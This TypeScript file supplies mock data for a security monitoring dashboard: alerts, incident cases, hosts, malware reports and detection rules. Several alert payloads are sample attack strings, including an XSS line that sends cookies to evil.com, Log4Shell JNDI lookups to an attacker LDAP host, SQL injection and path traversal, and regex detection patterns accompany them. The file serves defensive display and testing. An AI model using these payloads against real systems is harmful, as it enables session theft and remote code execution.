export type Severity = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW"

export interface Alert {
  id: string
  timestamp: string
  severity: Severity
  source_ip: string
  destination_ip: string
  category: string  // Aceita qualquer categoria
  description: string
  payload: string
}

// Helper para formatar qualquer categoria
export function formatCategory(category: string | undefined): string {
  if (!category) return "Unknown"
  return category.replace(/_/g, " ").replace(/\b\w/g, (c) => c.toUpperCase())
}

export const mockAlerts: Alert[] = [
  {
    id: "alert-001",
    timestamp: new Date(Date.now() - 1000 * 60 * 2).toISOString(),
    severity: "CRITICAL",
    source_ip: "192.168.1.105",
    destination_ip: "10.0.0.50",
    category: "web_exploit",
    description: "SQL Injection attempt detected on /api/users endpoint. Malicious payload in query parameter.",
    payload: `GET /api/users?id=1' OR '1'='1'; DROP TABLE users;-- HTTP/1.1\nHost: 10.0.0.50\nUser-Agent: sqlmap/1.7\nAccept: */*\nX-Forwarded-For: 192.168.1.105\n\n[DistilBERT confidence: 0.97]\n[Random Forest classification: web_exploit]\n[Pattern match: SQL injection - UNION SELECT]`,
  },
  {
    id: "alert-002",
    timestamp: new Date(Date.now() - 1000 * 60 * 5).toISOString(),
    severity: "HIGH",
    source_ip: "10.10.10.23",
    destination_ip: "10.0.0.1",
    category: "network_scan",
    description: "Nmap SYN scan detected across multiple ports (1-1024). Potential reconnaissance activity.",
    payload: `TCP SYN packets detected:\nSrc: 10.10.10.23 -> Dst: 10.0.0.1\nPorts scanned: 21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995\nScan rate: 450 packets/sec\nTTL: 64 | Window: 1024\n\n[DistilBERT confidence: 0.91]\n[Random Forest classification: network_scan]\n[Signature: Nmap SYN Stealth Scan]`,
  },
  {
    id: "alert-003",
    timestamp: new Date(Date.now() - 1000 * 60 * 8).toISOString(),
    severity: "CRITICAL",
    source_ip: "172.16.0.88",
    destination_ip: "10.0.0.22",
    category: "brute_force",
    description: "SSH brute force attack detected. 847 failed login attempts in the last 5 minutes.",
    payload: `SSH-2.0-OpenSSH_8.9\nFailed password for root from 172.16.0.88 port 44231 ssh2\nFailed password for admin from 172.16.0.88 port 44232 ssh2\nFailed password for user from 172.16.0.88 port 44233 ssh2\n... (847 attempts)\nAttempt rate: 2.82/sec\n\n[DistilBERT confidence: 0.99]\n[Random Forest classification: brute_force]\n[Threshold exceeded: max_attempts=10, window=300s]`,
  },
  {
    id: "alert-004",
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
    severity: "MEDIUM",
    source_ip: "192.168.2.200",
    destination_ip: "10.0.0.50",
    category: "anomaly",
    description: "Unusual outbound traffic volume detected. 2.4GB data transfer to external IP in 10 minutes.",
    payload: `Flow analysis:\nSrc: 192.168.2.200:49152 -> Dst: 203.0.113.42:443\nProtocol: TLS 1.3\nBytes transferred: 2,576,980,377\nDuration: 600s\nAvg bandwidth: 34.3 Mbps\nBaseline avg: 2.1 Mbps\n\n[DistilBERT confidence: 0.78]\n[Random Forest classification: anomaly]\n[Deviation: 16.3x above baseline]`,
  },
  {
    id: "alert-005",
    timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    severity: "LOW",
    source_ip: "10.0.0.15",
    destination_ip: "10.0.0.1",
    category: "network_scan",
    description: "Internal ARP scan detected from workstation. Likely network discovery tool running.",
    payload: `ARP requests detected:\nSrc MAC: aa:bb:cc:dd:ee:ff\nSrc IP: 10.0.0.15\nTarget range: 10.0.0.1 - 10.0.0.254\nPackets: 254\nInterval: 50ms\n\n[DistilBERT confidence: 0.62]\n[Random Forest classification: network_scan]\n[Note: Internal source - low threat]`,
  },
  {
    id: "alert-006",
    timestamp: new Date(Date.now() - 1000 * 60 * 25).toISOString(),
    severity: "HIGH",
    source_ip: "203.0.113.77",
    destination_ip: "10.0.0.50",
    category: "web_exploit",
    description: "Cross-Site Scripting (XSS) payload detected in POST request body targeting login form.",
    payload: `POST /auth/login HTTP/1.1\nHost: 10.0.0.50\nContent-Type: application/x-www-form-urlencoded\n\nusername=<script>document.location='http://evil.com/steal?c='+document.cookie</script>&password=test\n\n[DistilBERT confidence: 0.94]\n[Random Forest classification: web_exploit]\n[Pattern match: Reflected XSS - script injection]`,
  },
  {
    id: "alert-007",
    timestamp: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
    severity: "MEDIUM",
    source_ip: "10.10.10.45",
    destination_ip: "10.0.0.80",
    category: "brute_force",
    description: "FTP brute force attempt detected. Multiple failed authentications from single source.",
    payload: `220 FTP Server Ready\nUSER admin\n331 Password required\nPASS admin123\n530 Login incorrect\nUSER admin\nPASS password\n530 Login incorrect\n... (156 attempts)\n\n[DistilBERT confidence: 0.88]\n[Random Forest classification: brute_force]\n[Dictionary attack pattern detected]`,
  },
  {
    id: "alert-008",
    timestamp: new Date(Date.now() - 1000 * 60 * 35).toISOString(),
    severity: "CRITICAL",
    source_ip: "198.51.100.14",
    destination_ip: "10.0.0.50",
    category: "web_exploit",
    description: "Remote Code Execution attempt via Log4Shell vulnerability (CVE-2021-44228).",
    payload: `GET / HTTP/1.1\nHost: 10.0.0.50\nUser-Agent: \${jndi:ldap://198.51.100.14:1389/exploit}\nX-Api-Version: \${jndi:ldap://198.51.100.14:1389/exploit}\n\n[DistilBERT confidence: 0.99]\n[Random Forest classification: web_exploit]\n[CVE-2021-44228 - Log4Shell]\n[CRITICAL: RCE attempt]`,
  },
  {
    id: "alert-009",
    timestamp: new Date(Date.now() - 1000 * 60 * 42).toISOString(),
    severity: "LOW",
    source_ip: "10.0.0.30",
    destination_ip: "8.8.8.8",
    category: "anomaly",
    description: "DNS query volume spike detected. Possible DNS tunneling or C2 communication.",
    payload: `DNS queries from 10.0.0.30:\nQuery rate: 340 queries/min (baseline: 12/min)\nUnique domains: 287\nPattern: <random>.tunnel.suspicious-domain.com\nRecord type: TXT\nAvg response size: 512 bytes\n\n[DistilBERT confidence: 0.71]\n[Random Forest classification: anomaly]\n[Possible DNS tunneling - monitoring]`,
  },
  {
    id: "alert-010",
    timestamp: new Date(Date.now() - 1000 * 60 * 50).toISOString(),
    severity: "HIGH",
    source_ip: "172.16.5.100",
    destination_ip: "10.0.0.1",
    category: "network_scan",
    description: "OS fingerprinting detected. Attacker attempting to identify network device operating systems.",
    payload: `TCP/IP fingerprinting probes:\nSrc: 172.16.5.100 -> Dst: 10.0.0.1\nProbe types: SYN, NULL, FIN, XMAS\nPorts targeted: 22, 80, 443\nTTL variations: 64, 128, 255\nWindow sizes: 0, 1024, 65535\n\n[DistilBERT confidence: 0.86]\n[Random Forest classification: network_scan]\n[Signature: Nmap OS detection (-O flag)]`,
  },
  {
    id: "alert-011",
    timestamp: new Date(Date.now() - 1000 * 60 * 58).toISOString(),
    severity: "MEDIUM",
    source_ip: "192.168.3.77",
    destination_ip: "10.0.0.50",
    category: "web_exploit",
    description: "Directory traversal attempt on file download endpoint. Attempting to access /etc/passwd.",
    payload: `GET /download?file=../../../etc/passwd HTTP/1.1\nHost: 10.0.0.50\nUser-Agent: Mozilla/5.0\nAccept: */*\n\nResponse: 403 Forbidden\n\n[DistilBERT confidence: 0.92]\n[Random Forest classification: web_exploit]\n[Pattern match: Path traversal - ../]`,
  },
  {
    id: "alert-012",
    timestamp: new Date(Date.now() - 1000 * 60 * 65).toISOString(),
    severity: "LOW",
    source_ip: "10.0.0.5",
    destination_ip: "10.0.0.254",
    category: "anomaly",
    description: "Unusual ICMP traffic pattern. Large ICMP echo requests detected (potential ICMP tunneling).",
    payload: `ICMP Echo Requests:\nSrc: 10.0.0.5 -> Dst: 10.0.0.254\nPacket size: 1400 bytes (normal: 64)\nRate: 50 packets/sec\nPayload entropy: 7.8/8.0 (high)\n\n[DistilBERT confidence: 0.65]\n[Random Forest classification: anomaly]\n[Possible ICMP tunneling - data exfiltration]`,
  },
]

// ── Cases ──────────────────────────────────────────────────────────────

export type CaseStatus = "open" | "in_progress" | "resolved" | "closed"
export type CasePriority = "critical" | "high" | "medium" | "low"

export interface Case {
  id: string
  title: string
  status: CaseStatus
  priority: CasePriority
  assignee: string
  created_at: string
  updated_at: string
  description: string
  related_alert_ids: string[]
  source_ips: string[]
  affected_hosts: string[]
  notes: string[]
}

export const caseStatusLabels: Record<CaseStatus, string> = {
  open: "Open",
  in_progress: "In Progress",
  resolved: "Resolved",
  closed: "Closed",
}

export const casePriorityLabels: Record<CasePriority, string> = {
  critical: "Critical",
  high: "High",
  medium: "Medium",
  low: "Low",
}

export const mockCases: Case[] = [
  {
    id: "CASE-001",
    title: "Active SQL Injection Campaign Against Web Server",
    status: "open",
    priority: "critical",
    assignee: "admin",
    created_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 5).toISOString(),
    description:
      "Multiple SQL injection attempts detected targeting the /api/users endpoint from external IP 192.168.1.105. Payloads include UNION SELECT and DROP TABLE commands. The attacker is using sqlmap automated tool.",
    related_alert_ids: ["alert-001"],
    source_ips: ["192.168.1.105"],
    affected_hosts: ["10.0.0.50"],
    notes: [
      "WAF rules updated to block sqlmap user-agent patterns.",
      "IP 192.168.1.105 added to temporary blocklist pending investigation.",
      "Database audit initiated for /api/users endpoint.",
    ],
  },
  {
    id: "CASE-002",
    title: "SSH Brute Force Attack on Server 10.0.0.22",
    status: "in_progress",
    priority: "critical",
    assignee: "admin",
    created_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
    description:
      "Sustained SSH brute force attack with 847 failed login attempts in 5 minutes from IP 172.16.0.88. Attack targets root, admin, and common user accounts. Fail2ban triggered but attacker is rotating source ports.",
    related_alert_ids: ["alert-003"],
    source_ips: ["172.16.0.88"],
    affected_hosts: ["10.0.0.22"],
    notes: [
      "Fail2ban ban duration increased to 24 hours for SSH.",
      "SSH key-only authentication enforced for server 10.0.0.22.",
      "Monitoring for lateral movement from 172.16.0.88 subnet.",
    ],
  },
  {
    id: "CASE-003",
    title: "Log4Shell Exploitation Attempt (CVE-2021-44228)",
    status: "open",
    priority: "critical",
    assignee: "analyst_1",
    created_at: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 20).toISOString(),
    description:
      "Remote Code Execution attempt detected via Log4Shell vulnerability. Attacker injected JNDI LDAP payload in User-Agent and X-Api-Version headers from IP 198.51.100.14. Immediate containment required.",
    related_alert_ids: ["alert-008"],
    source_ips: ["198.51.100.14"],
    affected_hosts: ["10.0.0.50"],
    notes: [
      "Verified all Java applications patched to Log4j 2.17.1+.",
      "JNDI lookup disabled via JVM flag on affected server.",
      "External IP blocked at perimeter firewall.",
    ],
  },
  {
    id: "CASE-004",
    title: "Anomalous Data Exfiltration to External Host",
    status: "in_progress",
    priority: "high",
    assignee: "analyst_1",
    created_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
    description:
      "Unusual outbound traffic of 2.4GB detected from workstation 192.168.2.200 to external IP 203.0.113.42 over TLS 1.3. Transfer rate 16.3x above baseline. Possible data exfiltration.",
    related_alert_ids: ["alert-004"],
    source_ips: ["192.168.2.200"],
    affected_hosts: ["203.0.113.42"],
    notes: [
      "User workstation quarantined from network.",
      "Endpoint forensics initiated on 192.168.2.200.",
      "DLP logs requested for review.",
    ],
  },
  {
    id: "CASE-005",
    title: "Coordinated Network Reconnaissance Activity",
    status: "resolved",
    priority: "high",
    assignee: "admin",
    created_at: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 40).toISOString(),
    description:
      "Multi-stage reconnaissance detected including SYN scan, OS fingerprinting, and service enumeration from IPs in the 10.10.10.x and 172.16.5.x subnets. Likely prelude to targeted exploitation.",
    related_alert_ids: ["alert-002", "alert-010"],
    source_ips: ["10.10.10.23", "172.16.5.100"],
    affected_hosts: ["10.0.0.1"],
    notes: [
      "Source IPs identified as compromised lab machines.",
      "Lab network isolated from production segment.",
      "Machines re-imaged and accounts reset.",
      "IDS signatures updated for scan detection.",
    ],
  },
  {
    id: "CASE-006",
    title: "XSS Attack on Authentication Portal",
    status: "resolved",
    priority: "medium",
    assignee: "analyst_2",
    created_at: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
    description:
      "Reflected XSS payload detected in POST login form from external IP 203.0.113.77. Payload attempted to exfiltrate session cookies to attacker-controlled domain evil.com.",
    related_alert_ids: ["alert-006"],
    source_ips: ["203.0.113.77"],
    affected_hosts: ["10.0.0.50"],
    notes: [
      "Content Security Policy headers updated with strict nonce-based policy.",
      "Input sanitization reviewed and hardened on login endpoint.",
      "No evidence of successful cookie theft.",
    ],
  },
  {
    id: "CASE-007",
    title: "Suspected DNS Tunneling Communication",
    status: "open",
    priority: "medium",
    assignee: "analyst_2",
    created_at: new Date(Date.now() - 1000 * 60 * 75).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 50).toISOString(),
    description:
      "DNS query volume spike from 10.0.0.30 with 340 queries/min (baseline 12/min). High-entropy subdomain patterns and TXT record queries suggest possible DNS tunneling or C2 beacon activity.",
    related_alert_ids: ["alert-009"],
    source_ips: ["10.0.0.30"],
    affected_hosts: ["8.8.8.8"],
    notes: [
      "DNS traffic for suspect domain forwarded to sinkhole.",
      "Endpoint scan initiated on 10.0.0.30.",
    ],
  },
  {
    id: "CASE-008",
    title: "FTP Brute Force on Legacy Server",
    status: "closed",
    priority: "low",
    assignee: "admin",
    created_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    description:
      "FTP dictionary attack from internal IP 10.10.10.45 targeting legacy file server 10.0.0.80. 156 failed authentication attempts detected.",
    related_alert_ids: ["alert-007"],
    source_ips: ["10.10.10.45"],
    affected_hosts: ["10.0.0.80"],
    notes: [
      "FTP service disabled on legacy server - migrated to SFTP.",
      "Source machine identified as dev workstation with compromised credentials.",
      "User credentials rotated, machine re-imaged.",
      "Case closed: no data breach confirmed.",
    ],
  },
]

// ── Hosts ──────────────────────────────────────────────────────────────

export type HostStatus = "online" | "offline" | "compromised" | "quarantined"

export interface Host {
  id: string
  hostname: string
  ip: string
  mac: string
  os: string
  status: HostStatus
  last_seen: string
  open_ports: number[]
  services: string[]
  alerts_count: number
  cpu_usage: number
  memory_usage: number
  network_in: string
  network_out: string
}

export const hostStatusLabels: Record<HostStatus, string> = {
  online: "Online",
  offline: "Offline",
  compromised: "Compromised",
  quarantined: "Quarantined",
}

export const mockHosts: Host[] = [
  {
    id: "host-001",
    hostname: "web-server-01",
    ip: "10.0.0.50",
    mac: "AA:BB:CC:DD:EE:01",
    os: "Ubuntu 22.04 LTS",
    status: "online",
    last_seen: new Date(Date.now() - 1000 * 30).toISOString(),
    open_ports: [22, 80, 443, 8080],
    services: ["SSH", "Nginx", "Node.js"],
    alerts_count: 5,
    cpu_usage: 34,
    memory_usage: 62,
    network_in: "1.2 GB/h",
    network_out: "890 MB/h",
  },
  {
    id: "host-002",
    hostname: "db-server-01",
    ip: "10.0.0.22",
    mac: "AA:BB:CC:DD:EE:02",
    os: "Debian 12",
    status: "online",
    last_seen: new Date(Date.now() - 1000 * 15).toISOString(),
    open_ports: [22, 3306, 5432],
    services: ["SSH", "MySQL", "PostgreSQL"],
    alerts_count: 2,
    cpu_usage: 18,
    memory_usage: 45,
    network_in: "340 MB/h",
    network_out: "210 MB/h",
  },
  {
    id: "host-003",
    hostname: "workstation-200",
    ip: "192.168.2.200",
    mac: "AA:BB:CC:DD:EE:03",
    os: "Windows 11 Pro",
    status: "quarantined",
    last_seen: new Date(Date.now() - 1000 * 60 * 30).toISOString(),
    open_ports: [135, 445, 3389],
    services: ["RDP", "SMB"],
    alerts_count: 3,
    cpu_usage: 0,
    memory_usage: 0,
    network_in: "0 B/h",
    network_out: "0 B/h",
  },
  {
    id: "host-004",
    hostname: "firewall-gw-01",
    ip: "10.0.0.1",
    mac: "AA:BB:CC:DD:EE:04",
    os: "pfSense 2.7",
    status: "online",
    last_seen: new Date(Date.now() - 1000 * 5).toISOString(),
    open_ports: [22, 443],
    services: ["SSH", "Web UI"],
    alerts_count: 4,
    cpu_usage: 12,
    memory_usage: 28,
    network_in: "5.6 GB/h",
    network_out: "5.4 GB/h",
  },
  {
    id: "host-005",
    hostname: "dns-server-01",
    ip: "10.0.0.30",
    mac: "AA:BB:CC:DD:EE:05",
    os: "Ubuntu 20.04 LTS",
    status: "compromised",
    last_seen: new Date(Date.now() - 1000 * 60 * 10).toISOString(),
    open_ports: [22, 53],
    services: ["SSH", "BIND9"],
    alerts_count: 1,
    cpu_usage: 87,
    memory_usage: 71,
    network_in: "890 MB/h",
    network_out: "2.1 GB/h",
  },
  {
    id: "host-006",
    hostname: "legacy-ftp-01",
    ip: "10.0.0.80",
    mac: "AA:BB:CC:DD:EE:06",
    os: "CentOS 7",
    status: "offline",
    last_seen: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    open_ports: [],
    services: [],
    alerts_count: 1,
    cpu_usage: 0,
    memory_usage: 0,
    network_in: "0 B/h",
    network_out: "0 B/h",
  },
  {
    id: "host-007",
    hostname: "mail-server-01",
    ip: "10.0.0.60",
    mac: "AA:BB:CC:DD:EE:07",
    os: "Ubuntu 22.04 LTS",
    status: "online",
    last_seen: new Date(Date.now() - 1000 * 45).toISOString(),
    open_ports: [22, 25, 143, 465, 587, 993],
    services: ["SSH", "Postfix", "Dovecot"],
    alerts_count: 0,
    cpu_usage: 22,
    memory_usage: 38,
    network_in: "450 MB/h",
    network_out: "320 MB/h",
  },
  {
    id: "host-008",
    hostname: "dev-workstation-45",
    ip: "10.10.10.45",
    mac: "AA:BB:CC:DD:EE:08",
    os: "Windows 10 Pro",
    status: "offline",
    last_seen: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
    open_ports: [],
    services: [],
    alerts_count: 1,
    cpu_usage: 0,
    memory_usage: 0,
    network_in: "0 B/h",
    network_out: "0 B/h",
  },
]

// ── Malware Reports (mock for fallback) ─────────────────────────────

export interface MockMalwareReport {
  id: number
  name: string
  hash: string
  type: string
  severity: string
  status: string
  detected_at: string
  source_ip: string
  file_path: string
  description: string
}

export const mockMalwareReports: MockMalwareReport[] = [
  {
    id: 1,
    name: "Emotet Dropper",
    hash: "a3f5b2c8d1e94f6a7b8c9d0e1f2a3b4c",
    type: "Trojan",
    severity: "CRITICAL",
    status: "quarantined",
    detected_at: new Date(Date.now() - 1000 * 60 * 20).toISOString(),
    source_ip: "192.168.2.200",
    file_path: "/tmp/.cache/update.exe",
    description: "Emotet banking trojan dropper detected via behavioral analysis. File was attempting to establish C2 communication via HTTP POST to known Emotet infrastructure.",
  },
  {
    id: 2,
    name: "Cobalt Strike Beacon",
    hash: "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9",
    type: "Backdoor",
    severity: "CRITICAL",
    status: "active",
    detected_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    source_ip: "10.0.0.30",
    file_path: "/var/tmp/.sys_update",
    description: "Cobalt Strike beacon with DNS-based C2 channel detected. Process was performing DNS TXT record queries at high frequency to tunnel.suspicious-domain.com.",
  },
  {
    id: 3,
    name: "Mimikatz Variant",
    hash: "e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
    type: "Credential Stealer",
    severity: "HIGH",
    status: "removed",
    detected_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
    source_ip: "10.10.10.45",
    file_path: "C:\\Users\\dev\\AppData\\Local\\Temp\\svchost.exe",
    description: "Modified Mimikatz binary detected attempting to dump LSASS process memory. Packed with UPX and obfuscated with custom XOR encoding.",
  },
  {
    id: 4,
    name: "Log4Shell Payload",
    hash: "f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1",
    type: "Exploit",
    severity: "CRITICAL",
    status: "quarantined",
    detected_at: new Date(Date.now() - 1000 * 60 * 60).toISOString(),
    source_ip: "198.51.100.14",
    file_path: "/tmp/Exploit.class",
    description: "Java class file delivered via Log4Shell JNDI injection. Contains reverse shell payload targeting attacker LDAP server on port 1389.",
  },
  {
    id: 5,
    name: "XMRig Cryptominer",
    hash: "a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
    type: "Cryptominer",
    severity: "MEDIUM",
    status: "removed",
    detected_at: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
    source_ip: "10.10.10.23",
    file_path: "/opt/.hidden/xmr",
    description: "XMRig Monero cryptomining binary running as system service. Configured to use mining pool pool.minexmr.com with worker ID matching compromised host.",
  },
  {
    id: 6,
    name: "Webshell (PHP)",
    hash: "b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
    type: "Webshell",
    severity: "HIGH",
    status: "quarantined",
    detected_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    source_ip: "203.0.113.77",
    file_path: "/var/www/html/uploads/img_2024.php",
    description: "Obfuscated PHP webshell uploaded via file upload vulnerability. Provides remote command execution, file manager, and database access capabilities.",
  },
]

// ── Mock Rules (fallback when API is unavailable) ────────────────────

export interface MockRule {
  id: number
  name: string
  description: string
  severity: string
  enabled: boolean
  category: string
  pattern: string
  created_at: string
  updated_at: string
}

export const mockRules: MockRule[] = [
  {
    id: 1,
    name: "SQL Injection Detection",
    description: "Detects SQL injection patterns in HTTP request parameters including UNION SELECT, OR 1=1, and DROP TABLE payloads.",
    severity: "CRITICAL",
    enabled: true,
    category: "web_exploit",
    pattern: "(?i)(union\\s+select|or\\s+1\\s*=\\s*1|drop\\s+table|;\\s*--)",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 30).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 2).toISOString(),
  },
  {
    id: 2,
    name: "SSH Brute Force",
    description: "Triggers when more than 10 failed SSH authentication attempts are detected from a single source IP within 5 minutes.",
    severity: "CRITICAL",
    enabled: true,
    category: "brute_force",
    pattern: "Failed password.*ssh2",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 30).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24).toISOString(),
  },
  {
    id: 3,
    name: "Port Scan Detection",
    description: "Detects SYN scan activity when a source IP sends SYN packets to more than 20 different ports on a single host within 60 seconds.",
    severity: "HIGH",
    enabled: true,
    category: "network_scan",
    pattern: "TCP SYN.*ports_scanned > 20",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 25).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 3).toISOString(),
  },
  {
    id: 4,
    name: "XSS Payload Detection",
    description: "Detects cross-site scripting payloads in HTTP request parameters and body content including script tags and event handlers.",
    severity: "HIGH",
    enabled: true,
    category: "web_exploit",
    pattern: "(?i)(<script|on\\w+\\s*=|javascript:|<iframe)",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 20).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 12).toISOString(),
  },
  {
    id: 5,
    name: "DNS Tunneling Detection",
    description: "Flags hosts generating more than 100 DNS queries per minute with high-entropy subdomain patterns, indicating possible DNS tunneling.",
    severity: "MEDIUM",
    enabled: true,
    category: "anomaly",
    pattern: "dns_query_rate > 100 AND subdomain_entropy > 3.5",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 15).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 5).toISOString(),
  },
  {
    id: 6,
    name: "Data Exfiltration Alert",
    description: "Triggers when outbound data transfer exceeds 5x the baseline average for a given host over a 10-minute window.",
    severity: "MEDIUM",
    enabled: true,
    category: "anomaly",
    pattern: "outbound_bytes > baseline * 5 AND duration > 600",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 10).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 2).toISOString(),
  },
  {
    id: 7,
    name: "Log4Shell Exploit Detection",
    description: "Detects JNDI injection patterns in HTTP headers targeting Log4j vulnerability CVE-2021-44228.",
    severity: "CRITICAL",
    enabled: true,
    category: "web_exploit",
    pattern: "(?i)\\$\\{jndi:(ldap|rmi|dns)://",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 60).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24).toISOString(),
  },
  {
    id: 8,
    name: "ICMP Tunnel Detection",
    description: "Detects ICMP echo requests with abnormally large payloads (>100 bytes) and high entropy, indicating potential ICMP tunneling.",
    severity: "LOW",
    enabled: false,
    category: "anomaly",
    pattern: "icmp_payload_size > 100 AND payload_entropy > 6.0",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 5).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 5).toISOString(),
  },
  {
    id: 9,
    name: "FTP Brute Force",
    description: "Detects more than 5 failed FTP login attempts from a single source within 2 minutes.",
    severity: "MEDIUM",
    enabled: false,
    category: "brute_force",
    pattern: "530 Login incorrect.*count > 5",
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 8).toISOString(),
    updated_at: new Date(Date.now() - 1000 * 60 * 60 * 24 * 8).toISOString(),
  },
]

export function getAlertsByCategory(alerts: Alert[]) {
  const counts: Record<Category, number> = {
    web_exploit: 0,
    network_scan: 0,
    brute_force: 0,
    anomaly: 0,
  }
  alerts.forEach((a) => {
    counts[a.category]++
  })
  return Object.entries(counts).map(([name, value]) => ({
    name: name.replace("_", " ").replace(/\b\w/g, (c) => c.toUpperCase()),
    value,
    category: name,
  }))
}

export function getAlertsBySeverity(alerts: Alert[]) {
  const counts: Record<Severity, number> = {
    CRITICAL: 0,
    HIGH: 0,
    MEDIUM: 0,
    LOW: 0,
  }
  alerts.forEach((a) => {
    counts[a.severity]++
  })
  return Object.entries(counts).map(([name, value]) => ({ name, value }))
}

export const severityColors: Record<Severity, string> = {
  CRITICAL: "hsl(0, 72%, 51%)",
  HIGH: "hsl(25, 95%, 53%)",
  MEDIUM: "hsl(45, 93%, 47%)",
  LOW: "hsl(210, 100%, 52%)",
}

// Labels para categorias conhecidas (fallback para formatCategory)
export const categoryLabels: Record<string, string> = {
  web_exploit: "Web Exploit",
  network_scan: "Network Scan",
  brute_force: "Brute Force",
  anomaly: "Anomaly",
  trojan: "Trojan",
  malware: "Malware",
  dos: "DoS Attack",
  ddos: "DDoS Attack",
  "policy-violation": "Policy Violation",
  "protocol-command-decode": "Protocol Command",
  "bad-unknown": "Bad/Unknown",
}
